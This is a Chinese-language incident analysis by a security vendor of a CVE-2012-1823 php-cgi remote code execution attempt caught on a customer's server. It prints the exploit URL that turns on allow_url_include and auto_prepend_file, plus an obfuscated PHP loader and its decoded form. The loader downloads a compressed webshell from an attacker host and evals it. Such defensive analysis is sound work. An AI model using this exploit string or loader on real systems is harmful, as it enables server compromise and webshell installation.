# 【1】初见端倪

某日，在我司技术人员的日常巡检过程中发现有一个客户现场的聚铭网络流量智能分析审计系统（iNFA）报出“疑似存在
CVE-2012-1823攻击尝试”的安全事件，于是立即要求相关技术人员抓取流量数据包，以便对本次疑似攻击事件进行分析和判定。

本文内容主要对该次攻击事件涉及的分析思路和相关技术进行分享，现场抓取的数据包内容如下图所示（ **敏感数据已进行脱敏处理** ）。

![1637894952_61a04b28355eac3ee9fb7.png!small?1637894939001](https://image.3001.net/images/20211126/1637894952_61a04b28355eac3ee9fb7.png!small?1637894939001)

图1 攻击的相关数据

从数据的请求数据中可以发现几个可疑的点，应该重点关注和分析，或许能找到一些有用的线索。

1\. URL部分：

/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input

2\. User-Agent部分：

Mozilla/5.0 (compatible; Baiduspider/2.0;
+http://www.baidu.com/search/spider.html

3\. POST数据部分

4\. 请求的源地址：45.15.11.214

# 【2】抽丝剥茧

###  **1\. URL部分**

很明显，这个URL请求和正常的请求有很大区别，与其说看起来路径奇怪，不如说更像是特意构造出来的特殊语句。

?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input

简单解一下码，看起来好看一点：

?-d allow_url_include=on -d auto_prepend_file=php://input

查找相关资料，基本上确定了这条特殊的URL是在尝试利用php-cgi的远程代码执行漏洞（CVE-2012-1823），通过该漏洞来修改WEB服务器的相关配置（本次攻击是为了开启allow_url_include、auto_prepend_file配置），从而使得一些远程执行代码的功能得以实现。

简单来说，这个特殊请求的功能就是使后面的POST数据能以PHP文件格式执行。具体POST数据传递的内容是什么，我们继续接着看下去。

什么是CGI？

CGI 是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。

###  **2\. User-Agent部分：**

这部分比较简单了，用户代理这里利用”Baiduspider/2.0”字符串来试图混淆欺骗服务器是百度爬虫程序。

Mozilla/5.0 (compatible; Baiduspider/2.0;
+http://www.baidu.com/search/spider.html

###  **3\. POST数据部分：**

POST数据如下图所示：

![1637894970_61a04b3aa7fa1d2233b95.png!small?1637894956915](https://image.3001.net/images/20211126/1637894970_61a04b3aa7fa1d2233b95.png!small?1637894956915)

图2 POST数据

刚看到POST数据的时候我觉得这攻击者着实不低调啊，把攻击脚本起名为”niubi.php”，太得瑟了！

我们先对base64_decode()函数内的数据进行解码，得到：

<?php

$password="4w4";

$b="chr";

session_start();

if(empty($_SESSION["PhpCode"])){

$d=$b(104).$b(116).$b(116).$b(112).$b(58).$b(47).$b(47).$b(52).$b(119).$b(52).$b(46).$b(105).$b(110).$b(47).$b(112).$b(104).$b(112).$b(47).$b(112).$b(104).$b(112).$b(46).$b(103).$b(105).$b(102);

$e=$b(102).$b(105).$b(108).$b(101).$b(95);

$e.=$b(103).$b(101).$b(116).$b(95).$b(99);

$e.=$b(111).$b(110).$b(116).$b(101).$b(110);

$e.=$b(116).$b(115);

$_SESSION["PhpCode"]=$e($d);

}

$f=$b(103).$b(122).$b(105).$b(110);

$f.=$b(102).$b(108).$b(97).$b(116).$b(101);

@eval($f($_SESSION["PhpCode"]));

?>

核心代码还套了一层替换，对核心代码部分进行解密,尽量对原代码目的进行复现，结果如下：

<?php

$password="4w4";

session_start();

if(empty($_SESSION["PhpCode"])){

$_SESSION["PhpCode"]=file_get_contents(http://4w4.in/php/php.gif);

}

@eval(gzinflate($_SESSION["PhpCode"]));

?>

解到这里其实分析远还没有结束，攻击者使用file_get_contents函数调用了远程的文件（http://4w4.in/php/php.gif），再利用gzinflate函数对远程获取的文件内容进行解压缩，最后才能得到webshell的内容，手段十分隐蔽！

但是可惜的是，攻击者的反侦察的意识比较强，获取远程webshell站点做了访问限制，无法再进一步分析攻击脚本的内容了。

![1637894987_61a04b4b8f66944c1c3a9.png!small?1637894973856](https://image.3001.net/images/20211126/1637894987_61a04b4b8f66944c1c3a9.png!small?1637894973856)

图3 攻击者站点访问拒绝

![1637894999_61a04b5703c0a5dcee619.png!small?1637894984464](https://image.3001.net/images/20211126/1637894999_61a04b5703c0a5dcee619.png!small?1637894984464)

图4 攻击脚本地址来自英国

###  **4\. 请求的源地址：45.15.11.214**

经过情报分析确定，对用户服务器发起请求是一台来自香港的云服务器，含有扫描、暴力破解、漏洞利用的标签。

可以基本坐实本次确实是一次针对WEB服务器的恶意攻击行为。

![1637895011_61a04b639835cab256cc0.png!small?1637894997304](https://image.3001.net/images/20211126/1637895011_61a04b639835cab256cc0.png!small?1637894997304)

图5 情报查询结果

# 【3】总结

发现该情况的第一时间已通知用户采取了相应的处置及防护措施，所幸黑客最终没有得逞，未造成严重后果。

本文主要涉及的CVE-2012-1823漏洞影响的php版本为：

  * 5.0.0-5.3.11
  * 5.4.0-5.4.1

如果您还在使用以上版本的php,建议及时替换新版本，避免漏洞被黑客利用。

在不影响业务的情况下，尽可能减少不必要功能和配置的开启，缩小用户对服务器的可操作空间。

![1637895024_61a04b70c88cba18b68a1.png!small?1637895010573](https://image.3001.net/images/20211126/1637895024_61a04b70c88cba18b68a1.png!small?1637895010573)

图6 NVD CVE-2012-1823影响的php版本范围

 **参考文章：**

> https://blog.csdn.net/zy15667076526/article/details/111824777
>
> https://nvd.nist.gov/vuln/detail/cve-2012-1823

